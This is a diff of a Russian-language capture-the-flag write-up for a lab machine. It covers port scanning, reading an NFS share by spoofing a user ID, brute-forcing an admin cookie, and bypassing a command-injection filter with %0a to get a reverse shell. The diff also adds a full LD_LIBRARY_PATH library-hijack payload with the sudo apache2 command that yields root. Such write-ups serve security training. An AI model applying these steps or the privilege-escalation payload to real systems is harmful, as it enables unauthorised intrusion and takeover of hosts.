@@ -1,4 +1,4 @@
-###H 3 Доступ к системе
+### Доступ к системе
 1. По классике начинаем со скана портов
 ```
 sudo nmap -sV -sC 10.112.138.240
@@ -47,43 +47,47 @@ PORT     STATE SERVICE VERSION
 2049/tcp open  nfs     2-4 (RPC #100003)
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 ```
-Посмотрим сайт на 80 порту. Сразу посмотрим директории через ффаф. Там тоже ничего интересного 
+Посмотрим сайт на 80 порту. Сразу пофаззим директории через ффаф. Там тоже ничего интересного 
 
-<img width="1025" height="622" alt="image" src="https://github.com/user-attachments/assets/d308331d-4fa5-430b-b7bd-b6b31ac3908d" />
+<img width="761" height="622" alt="image" src="https://github.com/user-attachments/assets/d308331d-4fa5-430b-b7bd-b6b31ac3908d" />
 
 Сам сайт небольшой - стандартное поле ввода и админская панель, к которой доступа у нас нет(only the admin can access this page). 
-Прогнала через форму логина sqlmap, посмотрела запросы через бурп, быстро просмотрела код страничек - ничего интересного.
+Прогнала через форму логина sqlmap, посмотрела запросы через бурп, быстро просмотрела код страничек - тоже ничего поезного.
 
-<img width="557" height="193" alt="image" src="https://github.com/user-attachments/assets/852c4695-6bfa-4597-a369-c9eb8ff42e4c" />
+<img width="761" height="193" alt="image" src="https://github.com/user-attachments/assets/852c4695-6bfa-4597-a369-c9eb8ff42e4c" />
 
-Но у нас есть форма регистрации и понимание, что нам вероятнее всего нужно получить доступ к аккаунту админа. И вот мы проверяем форму регистрации
+Но у нас есть форма регистрации и понимание, что нам, вероятнее всего, нужно получить доступ к аккаунту админа. И вот мы проверяем форму регистрации
 и получаем приятный результат (сейчас увидела, что корректность юзернейма подтверждается и при попытке залогиниться). Но брутфорсить не выйдет из-за ограничения
 на ввод пароля (5 попыток)
 
-<img width="651" height="259" alt="image" src="https://github.com/user-attachments/assets/fd0132c8-ba96-44cb-abfc-f7e110d12672" />
+<img width="761" height="259" alt="image" src="https://github.com/user-attachments/assets/fd0132c8-ba96-44cb-abfc-f7e110d12672" />
 
 Возвращаемся к открытым портам. Есть возможность посмотреть сетевую файловую систему (nfs), воспользуемся ей
 
 ``` Show mount -e 10.112.138.240 ```
 
-Там лежит /share/mount *. Монтируем к себе. Открыть не удалось даже под рутом - включена защита nsf, а файл принадлежит юзеру 1003. Попробуем создать такого же пользователя
+Там лежит /share/mount *. Монтируем к себе.
+
+```sudo mount -t nfs 10.112.138.240:/var/share/mount /tmp/server_files```
+
+Открыть не удалось даже под рутом - включена защита nsf, а файл принадлежит юзеру с uid 1003. Попробуем создать такого же пользователя
 
 ```sudo useradd -u 1003 test```
 
-Открываем папку и понимаем, что никто в /etc/exports хотя бы all_squash не настроил. От пользователя test читаем содержимое папки и получаем креды от ftp. Логинемся
+Открываем папку через этого юзера, и к счастью, никто на сервере в /etc/exports хотя бы all_squash не настроил - благодаря таким махинациям можем посмотреть содержимое папки. От пользователя test читаем содержимое папки и получаем креды от ftp. Логинемся
 
-<img width="640" height="432" alt="image" src="https://github.com/user-attachments/assets/26d9f605-bae1-4c0b-861c-c9790cdbcf59" />
+<img width="761" height="432" alt="image" src="https://github.com/user-attachments/assets/26d9f605-bae1-4c0b-861c-c9790cdbcf59" />
 
 Выгружаем все файлы к себе. И в итоге мы получили файл с 150 паролями и такое сообщение от админа
 
-<img width="1395" height="120" alt="image" src="https://github.com/user-attachments/assets/2bcd5238-283e-4e1d-aaaf-6ad618c6d2e6" />
+<img width="761" height="200" alt="image" src="https://github.com/user-attachments/assets/2bcd5238-283e-4e1d-aaaf-6ad618c6d2e6" />
 
 Понимаем, что брутфорс нам недоступен. Я также попробовала xxe инъекцию из-за application/xml в content-type, но сервер все-таки фильтрует подобное. 
 Из-за этого я решила вернуться к созданному аккаунту на сайте, в котором по сути ничего и не было (машина простая, поэтому такой распорядок вещей вполне можно принимать за намек). И что у нас там есть? Конечно, куки. Попробуем посмотреть на них.
 
 <img width="287" height="255" alt="image" src="https://github.com/user-attachments/assets/8d4e4304-f812-46e8-bbd7-a784f0bbd5a3" />
 
-Можно предположить, что куки - закодированный юзернейм + хеш (походу MD5). Проверила - так и оказалось. 
+Можно предположить, что куки - закодированный в base64 юзернейм + хеш (походу MD5). Проверила - так и оказалось. 
 
 Пишем код для брутфорса кук
 
@@ -211,11 +215,12 @@ if __name__ == "__main__":
 Запускаем: ```python script.py http://10.112.138.240 admin passwords.txt --fail "Welcome Guest"```
 Находим нужный пароль и заходим в админский аккаунт, получаем доступ к командной строке. Очевидно, что нужна cmd инъекция
 
-<img width="915" height="385" alt="image" src="https://github.com/user-attachments/assets/f8d80b59-d692-4e9d-8365-3a2272fbcba8" />
+<img width="761" height="355" alt="image" src="https://github.com/user-attachments/assets/f8d80b59-d692-4e9d-8365-3a2272fbcba8" />
 
 Фильтр обходится через %0a. Далее опрокидываем себе реверс шелл и получаем шелл
 
-<img width="1347" height="212" alt="image" src="https://github.com/user-attachments/assets/d1ef2d72-d692-4a90-a311-3890220a4000" />
+<img width="761" height="212" alt="image" src="https://github.com/user-attachments/assets/d1ef2d72-d692-4a90-a311-3890220a4000" />
+
 
 <img width="761" height="51" alt="image" src="https://github.com/user-attachments/assets/ca340642-8216-450f-813c-1911b5c50c24" />
 
@@ -230,7 +235,29 @@ if __name__ == "__main__":
 ### Взятие рута
 машина, честно сказать, вышла муторная, поэтому как же я рада была увидеть это после ``` sudo -l ```. (господи, скажите, что на тачке есть компилятор)
 
-<img width="659" height="125" alt="image" src="https://github.com/user-attachments/assets/d13d4018-c57f-46a7-b4fd-c0b337eea362" />
+<img width="761" height="125" alt="image" src="https://github.com/user-attachments/assets/d13d4018-c57f-46a7-b4fd-c0b337eea362" />
 
-мы можем подгружать переменные окружения перед выполнением скрипта и, собственно, может исполнять парочку от рута - супер.
-создаем динамическую библиотеку
+мы можем указать путь к библиотеке и запускать апаче от судо - следовательно, нужно создать динамическую библиотеку с пэйлоадом и указать путь к ней через переменную окружения при запуске. создаем в /tmp library_path.c
+```
+echo "#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+    unsetenv(\"LD_LIBRARY_PATH\");
+    setresuid(0,0,0);
+    system(\"/bin/bash -p\");
+}" > library_path.c
+```
+компилируем в динамическую библиотеку
+```
+gcc -fPIC -shared -o /tmp/libcrypt.so.1 /tmp/library_path.c
+```
+далее запускаем процесс, установив нужный нам путь до библиотеки с пэйлоадом
+```
+sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
+```
+и радуемся - мы есть рут
+
+<img width="761" height="250" alt="image" src="https://github.com/user-attachments/assets/3c0ae962-7f26-4b15-858b-3b81bf748542" />
